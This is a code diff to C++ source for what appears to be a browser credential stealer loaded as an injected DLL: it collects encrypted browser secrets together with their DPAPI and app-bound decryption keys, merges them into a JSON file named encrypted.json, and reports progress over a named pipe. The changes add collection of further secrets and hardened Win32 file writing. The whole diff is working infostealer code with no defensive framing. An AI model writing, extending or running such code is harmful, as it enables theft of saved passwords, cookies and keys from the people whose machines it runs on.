@@ -58,6 +58,7 @@ static BrowserPaths GetBrowserPaths(const std::string& browserType) {
 }
 
 static std::string ToBase64(const std::vector<uint8_t>& data) {
+    if (data.empty()) return "";
     DWORD size = 0;
     CryptBinaryToStringA(data.data(), (DWORD)data.size(),
         CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, nullptr, &size);
@@ -201,7 +202,7 @@ static DWORD DoCollectorWork(LPCWSTR pipeName, HMODULE hModule) {
     HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
     LogDebug(SUCCEEDED(hr) ? "[+] CoInitialize OK" : "[-] CoInitialize FAILED");
 
-    PipeClient pipe(pipeName);    
+    PipeClient pipe(pipeName);
     if (!pipe.IsValid()) {
         LogDebug("[-] Pipe client invalid");
         CoUninitialize();
@@ -244,57 +245,112 @@ static DWORD DoCollectorWork(LPCWSTR pipeName, HMODULE hModule) {
     }
 
     ExtraExtractor extras(pipe);
-    extras.CollectAll();                          
+    extras.CollectAll();
 
-    
+    const auto& extraSecrets = extras.GetSecrets();
+    for (const auto& sec : extraSecrets) {
+        if (!first) jsonOut << ",\n";
+        first = false;
+        jsonOut << "  {\n"
+            << "    \"title\": \"" << EscapeJson(sec.topic + ": " + sec.path) << "\",\n"
+            << "    \"path\": \"" << EscapeJson(sec.path) << "\",\n"
+            << "    \"encrypted_text\": \"" << ToBase64(sec.encrypted_data) << "\",\n"
+            << "    \"related_dpapi\": \"" << EscapeJson(sec.related_dpapi) << "\",\n"
+            << "    \"related_abe\": \"" << EscapeJson(sec.related_abe) << "\"\n"
+            << "  }";
+    }
 
     jsonOut << "\n]";
     std::string jsonStr = jsonOut.str();
 
-    auto stampKey = [&](const std::string& placeholder, const std::string& value) {
-        if (value.empty()) return;
-        size_t pos = 0;
-        while ((pos = jsonStr.find(placeholder, pos)) != std::string::npos) {
-            std::string replacement = "\"" + value + "\"";
-            jsonStr.replace(pos, placeholder.length(), placeholder.substr(0, placeholder.length() - 1) + value + "\"");
-            pos += placeholder.length() - 1 + value.length() + 1;
-        }
-        };
+    // Replace placeholders for browser keys
     if (hasAbe) {
         size_t pos = 0;
         const std::string search = "\"related_abe\": \"\"";
         const std::string replace = "\"related_abe\": \"" + abeKeyBase64 + "\"";
-        while ((pos = jsonStr.find(search, pos)) != std::string::npos)
-        {
-            jsonStr.replace(pos, search.length(), replace); pos += replace.length();
+        while ((pos = jsonStr.find(search, pos)) != std::string::npos) {
+            jsonStr.replace(pos, search.length(), replace);
+            pos += replace.length();
         }
     }
     if (!dpapiKeyBase64.empty()) {
         size_t pos = 0;
         const std::string search = "\"related_dpapi\": \"\"";
         const std::string replace = "\"related_dpapi\": \"" + dpapiKeyBase64 + "\"";
-        while ((pos = jsonStr.find(search, pos)) != std::string::npos)
-        {
-            jsonStr.replace(pos, search.length(), replace); pos += replace.length();
+        while ((pos = jsonStr.find(search, pos)) != std::string::npos) {
+            jsonStr.replace(pos, search.length(), replace);
+            pos += replace.length();
         }
     }
-    (void)stampKey;
 
+    // ---- Write file using Win32 API with full error checking ----
     std::filesystem::path outputDir(config.outputPath);
-    std::filesystem::create_directories(outputDir);
-    std::ofstream out(outputDir / "encrypted.json");
-    if (out.is_open()) {
-        out << jsonStr;
-        out.close();
-        pipe.Log("ENCRYPTED_JSON:" + (outputDir / "encrypted.json").string());
-        pipe.Log("INFO: Collection finished successfully.");
-        LogDebug("[+] encrypted.json written");
-    }
-    else {
-        pipe.Log("ERROR: Failed to write encrypted.json");
-        LogDebug("[-] Failed to write encrypted.json");
+    std::wstring wideOutputDir = outputDir.wstring();
+
+    // Create directory tree if needed
+    if (!CreateDirectoryW(wideOutputDir.c_str(), nullptr) && GetLastError() != ERROR_ALREADY_EXISTS) {
+        std::wstring::size_type pos = 0;
+        while ((pos = wideOutputDir.find(L'\\', pos + 1)) != std::wstring::npos) {
+            std::wstring subdir = wideOutputDir.substr(0, pos);
+            if (!CreateDirectoryW(subdir.c_str(), nullptr) && GetLastError() != ERROR_ALREADY_EXISTS) {
+                std::string errMsg = "Cannot create directory: " + Core::ToUtf8(subdir);
+                pipe.Log("FILE_WRITE_FAIL:" + errMsg);
+                LogDebug(errMsg.c_str());
+                CoUninitialize();
+                FreeLibraryAndExitThread(hModule, 1);
+                return 1;
+            }
+        }
+        if (!CreateDirectoryW(wideOutputDir.c_str(), nullptr) && GetLastError() != ERROR_ALREADY_EXISTS) {
+            std::string errMsg = "Cannot create output directory: " + Core::ToUtf8(wideOutputDir);
+            pipe.Log("FILE_WRITE_FAIL:" + errMsg);
+            LogDebug(errMsg.c_str());
+            CoUninitialize();
+            FreeLibraryAndExitThread(hModule, 1);
+            return 1;
+        }
     }
 
+    std::filesystem::path jsonPath = outputDir / "encrypted.json";
+    HANDLE hFile = CreateFileW(jsonPath.wstring().c_str(), GENERIC_WRITE, 0, nullptr,
+        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        DWORD err = GetLastError();
+        std::string errMsg = "CreateFileW failed, error " + std::to_string(err);
+        pipe.Log("FILE_WRITE_FAIL:" + errMsg);
+        LogDebug(errMsg.c_str());
+        CoUninitialize();
+        FreeLibraryAndExitThread(hModule, 1);
+        return 1;
+    }
+
+    DWORD written = 0;
+    BOOL writeOk = WriteFile(hFile, jsonStr.c_str(), (DWORD)jsonStr.size(), &written, nullptr);
+    CloseHandle(hFile);
+
+    if (!writeOk || written != jsonStr.size()) {
+        std::string errMsg = "WriteFile failed: wrote " + std::to_string(written) + " of " + std::to_string(jsonStr.size());
+        pipe.Log("FILE_WRITE_FAIL:" + errMsg);
+        LogDebug(errMsg.c_str());
+        CoUninitialize();
+        FreeLibraryAndExitThread(hModule, 1);
+        return 1;
+    }
+
+    // Verify file exists and has content
+    if (!std::filesystem::exists(jsonPath) || std::filesystem::file_size(jsonPath) == 0) {
+        std::string errMsg = "File missing or empty after write";
+        pipe.Log("FILE_WRITE_FAIL:" + errMsg);
+        LogDebug(errMsg.c_str());
+        CoUninitialize();
+        FreeLibraryAndExitThread(hModule, 1);
+        return 1;
+    }
+
+    pipe.Log("FILE_WRITE_OK:" + jsonPath.string());
+    LogDebug(("[+] Successfully wrote " + jsonPath.string()).c_str());
+
+    pipe.Log("INFO: Collection finished successfully.");
     CoUninitialize();
     FreeLibraryAndExitThread(hModule, 0);
     return 0;
